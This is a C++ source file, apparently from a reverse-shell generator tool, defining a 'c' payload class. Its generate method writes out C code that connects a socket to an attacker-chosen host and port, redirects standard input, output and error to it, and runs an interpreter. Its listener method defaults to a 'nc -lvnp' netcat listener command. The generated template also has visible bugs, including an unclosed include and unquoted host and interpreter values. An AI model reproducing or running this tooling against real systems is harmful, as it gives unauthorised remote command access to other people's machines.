#include "C_Payload.h"
#include "../../listeners/ListenerFactory.h"
#include <sstream>
#include <string>

std::string CPayload::name() const {
return "c";
}

std::string CPayload::generate(const Options& opts) const {
    std::ostringstream ss;
    ss << "#include <stdio.h\n"
       << "#include <sys/socket.h>\n"
       << "#include <sys/types.h>\n"
       << "#include <stdlib.h>\n"
       << "#include <unistd.h>\n"
       << "#include <netinet/in.h>\n"
       << "#include <arpa/inet.h>\n\n"
       << "int main(void){\n"
       << "     int port = " << std::to_string(opts.port) << ";\n"
       << "     struct sockaddr_in revsockaddr;\n\n"
       << "     int sockt = socket(AF_INET, SOCK_STREAM, 0);\n"
       << "     revsockaddr.sin_family = AF_INET;\n"
       << "     revsockaddr.sin_port = htons(port);\n"
       << "     revsockaddr.sin_addr.s_addr = inet_addr(" << opts.host << ");\n"
       << "     connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr));\n"
       << "     dup2(sockt, 0);\n"
       << "     dup2(sockt, 1);\n"
       << "     dup2(sockt, 2);\n"
       << "     char * const argv[] = {" + opts.interpreter +", NULL};\n"
       << "     execvp(" + opts.interpreter + ", argv, NULL);\n\n"
       << "     return 0;\n"
       << "}\n";
    return ss.str();
}

std::string CPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}